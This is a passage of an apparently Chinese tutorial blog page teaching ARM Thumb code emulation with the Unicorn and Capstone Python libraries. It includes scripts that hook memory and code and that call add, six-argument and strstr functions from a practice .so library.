class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):   <span class="comment">#打印arm下所有寄存器的内容</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line">        </span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_block</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_blocak------------------------------------------------------&quot;</span>)</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[hook_blocak_addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb</span>():</span><br><span class="line">    CODE=<span class="string">b&#x27;\x08\x44\x00\x90\x4f\xf0\x01\x07\x00\xdf&#x27;</span></span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    <span class="built_in">bytes</span>=mu.mem_read(address,<span class="number">10</span>) <span class="comment">#这个函数返回bytearray类型</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,content:%s&quot;</span>%(address,binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment">#转化为十六进制形式</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x100</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x200</span>)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    mu.hook_add(UC_HOOK_BLOCK,hook_block)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(address+<span class="number">1</span>,address+<span class="built_in">len</span>(CODE))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">        <span class="built_in">bytes</span> = mu.mem_read(<span class="number">0x0</span>, <span class="number">4</span>)  <span class="comment"># 打印内存中的值</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ADDRESS:%x,0x:%s&quot;</span> % (<span class="number">0x0</span>, binascii.b2a_hex(<span class="built_in">bytes</span>)))  <span class="comment"># 转化为十六进制形式</span></span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb()</span><br></pre></td></tr></table></figure><h2 id="第三课时">第三课时</h2><h3 id="调用so中函数">调用so中函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#void (*uc_cb_hookmem_t)(uc_engine *uc, uc_mem_type type,uint64_t address, int size, int64_t value, void *user_data);</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_mem_unmapped</span>(<span class="params">mu,<span class="built_in">type</span>,address,size,value,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_WRITE_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;write addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == UC_MEM_READ_UNMAPPED:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;read addr:0x%x,size:%d,value:0x%x&quot;</span> % (address, size, value))</span><br><span class="line">    mu.mem_map(<span class="number">0x0</span>,<span class="number">0x1000</span>) <span class="comment">#映射</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;hook_mem_unmapped type:%d addr:0x%x,size:%d,value:0x%x&quot;</span> % (<span class="built_in">type</span>, address, size, value))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>   <span class="comment">#返回true 模拟器继续往下面执行代码  False则相反</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用add(int a,int b)函数  ==&gt;  两个参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb1</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x1264C</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x1264C</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span></span><br><span class="line">    </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#SP寄存器赋值</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)  <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line"></span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x0001264c</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x1265e</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="comment">#调用add_six(int a,int b,int c,int d,int e,int f) ==&gt; 六个参数需要用到栈</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">testthumb2</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12660</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12660</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    sp=address+size-<span class="number">16</span>                     </span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)   <span class="comment">#sp寄存器赋值</span></span><br><span class="line">    mu.mem_write(address,CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#寄存器赋值</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,<span class="number">0x1</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))  <span class="comment">#两个参数要入栈</span></span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    <span class="comment">#因为代码开始处有个 push &#123;lr&#125;，保持堆栈平衡</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)  </span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    mu.hook_add(UC_HOOK_MEM_WRITE_UNMAPPED,hook_mem_unmapped)</span><br><span class="line">    addrstart=address+<span class="number">0x12660</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x126B0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)</span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    testthumb1()</span><br><span class="line">    testthumb2()</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">#打印寄存器内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printArm32Reg</span>(<span class="params">mu</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">66</span>,<span class="number">79</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span>%(i-<span class="number">66</span>,mu.reg_read(i)))</span><br><span class="line"><span class="comment">#typedef void (*uc_cb_hookcode_t)(uc_engine *uc, uint64_t address, uint32_t size, void *user_data);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出指针所指向的地址的字符串</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readstring</span>(<span class="params">mu,address</span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp=mu.mem_read(address,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> tmp[<span class="number">0</span>]!=<span class="number">0</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(tmp[<span class="number">0</span>])</span><br><span class="line">        address=address+<span class="number">1</span></span><br><span class="line">        tmp = mu.mem_read(address, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu,address,size,user_data</span>):</span><br><span class="line">    <span class="keyword">if</span> address ==<span class="number">0x1000</span>+<span class="number">0x126C8</span>:   <span class="comment">#当运行到strstr()函数时</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;运行到strstr&quot;</span>)</span><br><span class="line">        <span class="comment">#参看strstr的参数地址</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">0</span>, mu.reg_read(<span class="number">66</span>)))  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;R%d,value:%x&quot;</span> % (<span class="number">1</span>, mu.reg_read(<span class="number">67</span>)))</span><br><span class="line">        <span class="comment">#打印两个参数字符串</span></span><br><span class="line">        r0value=readstring(mu,mu.reg_read(arm_const.UC_ARM_REG_R0))</span><br><span class="line">        r1value = readstring(mu, mu.reg_read(arm_const.UC_ARM_REG_R1))</span><br><span class="line">        <span class="built_in">print</span>(r0value+<span class="string">&#x27;----------&#x27;</span>+r1value)</span><br><span class="line">        <span class="comment">#自己实现strstr()操作</span></span><br><span class="line">        index = r0value.find(r1value)</span><br><span class="line">        <span class="keyword">if</span> index == -<span class="number">1</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mu.reg_write(unicorn.arm_const.UC_ARM_REG_R0, index)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;call strstr------------------&quot;</span>)</span><br><span class="line"></span><br><span class="line">    code=mu.mem_read(address,size)</span><br><span class="line">    cp = Cs(CS_ARCH_ARM, CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(code, <span class="number">0</span>, <span class="built_in">len</span>(code)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span> % (address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    printArm32Reg(mu)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;------------------------------------------------------&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#调用执行strstr(char *a,char *b)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">call_strstr</span>():</span><br><span class="line">    CODE=<span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;libunicorncourse03.so&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> sofile:</span><br><span class="line">        CODE=sofile.read()</span><br><span class="line">    cp=Cs(CS_ARCH_ARM,CS_MODE_THUMB)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.disasm(CODE[<span class="number">0x12698</span>:],<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[addr:%x]:%s %s\n&quot;</span>%(<span class="number">0x12698</span>+i.address,i.mnemonic,i.op_str))</span><br><span class="line">    mu=Uc(UC_ARCH_ARM,UC_MODE_THUMB)</span><br><span class="line">    address=<span class="number">0x1000</span></span><br><span class="line">    size=<span class="number">1024</span>*<span class="number">1024</span>*<span class="number">10</span></span><br><span class="line">    mu.mem_map(address,size)</span><br><span class="line">    mu.mem_write(address, CODE)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#在开辟一个空间 存放一个字符串</span></span><br><span class="line">    mu.mem_map(address+size+<span class="number">0x1000</span>,<span class="number">1024</span>)</span><br><span class="line">    mu.mem_write(address+size+<span class="number">0x1000</span>,<span class="string">b&quot;flag4&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    sp=address+size-<span class="number">1000</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_SP,sp)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R0,address+size+<span class="number">0x1000</span>)  <span class="comment">#存放指針指向&#x27;flag4&#x27;</span></span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R1,<span class="number">0x2</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R2, <span class="number">0x3</span>)</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_R3, <span class="number">0x4</span>)</span><br><span class="line">    mu.mem_write(sp + <span class="number">4</span>, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x6</span>))</span><br><span class="line">    mu.mem_write(sp, struct.pack(<span class="string">&quot;I&quot;</span>, <span class="number">0x5</span>))</span><br><span class="line">    mu.reg_write(arm_const.UC_ARM_REG_LR, <span class="number">0x445</span> + address)</span><br><span class="line">    </span><br><span class="line">    mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">    addrstart=address+<span class="number">0x12698</span>+<span class="number">1</span></span><br><span class="line">    addrend=address+<span class="number">0x12714</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        mu.emu_start(addrstart,addrend)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;模拟执行后寄存器内容-----------&quot;</span>)</span><br><span class="line">        printArm32Reg(mu)    </span><br><span class="line">    <span class="keyword">except</span> UcError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    call_strstr()</span><br></pre></td></tr></table></figure><h2 id="第四课时">第四课时</h2><h4 id="调用jni接口函数">调用jni接口函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 